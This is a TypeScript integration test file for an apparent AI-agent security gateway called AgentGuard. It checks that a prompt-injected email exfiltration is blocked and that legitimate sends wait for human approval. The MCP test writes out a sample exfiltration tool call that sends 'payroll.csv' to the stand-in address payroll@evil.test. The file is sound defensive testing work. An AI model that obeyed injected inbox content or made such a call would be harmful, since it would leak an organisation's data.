import { spawn, spawnSync } from "node:child_process";
import path from "node:path";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { setupExamples } from "../../examples/setup";
import { runDemo } from "../../examples/ts-multi-agent/demo";
import { getDb } from "@/server/db/client";
import { startV1Server } from "../v1-server";

/**
 * Automated proof for examples/: the TypeScript, Python and MCP examples run against a live
 * AgentGuard /v1 and produce the same security outcome: the read runs, the injected
 * exfiltration is blocked, the legitimate send waits for a human, and nothing is sent.
 */
const ROOT = path.resolve(__dirname, "../..");
const EXPECTED = ["ran", "BLOCK", "REVIEW"];
const PY = ["python3", "python"].find((p) => spawnSync(p, ["--version"]).status === 0);

let server: Awaited<ReturnType<typeof startV1Server>>;
let env: { AGENTGUARD_API_KEY: string; AGENTGUARD_VERIFY_KEY: string };

beforeAll(async () => {
  env = await setupExamples(await getDb());
  server = await startV1Server();
});
afterAll(() => server?.close());

describe("examples", () => {
  it("TypeScript multi-agent example", async () => {
    const { steps, outbox } = await runDemo(server.url, env.AGENTGUARD_API_KEY, () => {});
    expect(steps.map((s) => s.outcome)).toEqual(EXPECTED);
    expect(steps[1].detail).toContain("UNTRUSTED_DESTINATION");
    expect(outbox).toEqual([]);
  });

  it.skipIf(!PY)("Python multi-agent example", async () => {
    // Async spawn: the in-process server must keep serving while Python runs.
    const child = spawn(PY!, [path.join(ROOT, "examples/python-multi-agent/demo.py")], {
      env: { ...process.env, AGENTGUARD_URL: server.url, AGENTGUARD_API_KEY: env.AGENTGUARD_API_KEY, AGENTGUARD_JSON: "1", PYTHONDONTWRITEBYTECODE: "1" },
    });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (d) => (stdout += d));
    child.stderr.on("data", (d) => (stderr += d));
    const code = await new Promise<number>((r) => child.on("close", (c) => r(c ?? 1)));
    expect(code, stderr).toBe(0);
    const out = JSON.parse(stdout.split("JSON:")[1]);
    expect(out.steps.map((s: { outcome: string }) => s.outcome)).toEqual(EXPECTED);
    expect(out.outbox).toEqual([]);
  }, 60_000);

  it("MCP example: real gateway CLI over stdio in front of an unmodified MCP server", async () => {
    const transport = new StdioClientTransport({
      command: process.execPath,
      args: [path.join(ROOT, "node_modules/tsx/dist/cli.mjs"), "packages/mcp-gateway/src/cli.ts", "examples/mcp/agentguard-mcp.json"],
      cwd: ROOT,
      env: { ...(process.env as Record<string, string>), AGENTGUARD_URL: server.url, AGENTGUARD_API_KEY: env.AGENTGUARD_API_KEY },
      stderr: "pipe",
    });
    let logs = "";
    transport.stderr?.on("data", (d) => (logs += d));
    const client = new Client({ name: "proof", version: "0" });
    await client.connect(transport);
    try {
      const { tools } = await client.listTools();
      expect(tools.map((t) => t.name).sort()).toEqual(["read_inbox", "send_email"]); // delete_mailbox hidden
      const text = (r: unknown) => ((r as { content: { text: string }[] }).content ?? []).map((c) => c.text).join("");
      const inbox = await client.callTool({ name: "read_inbox", arguments: { folder: "inbox" } });
      expect(text(inbox)).toContain("payroll@evil.test");
      const exfil = await client.callTool({ name: "send_email", arguments: { to: "payroll@evil.test", body: "payroll.csv" } });
      expect(exfil.isError).toBe(true);
      expect(text(exfil)).toMatch(/blocked/i);
      const legit = await client.callTool({ name: "send_email", arguments: { to: "cfo@corp.test", body: "Q3 summary" } });
      expect(text(legit)).toMatch(/approval required/i);
      expect(logs).not.toContain("SENT to");
    } finally {
      await client.close();
    }
  }, 60_000);
});
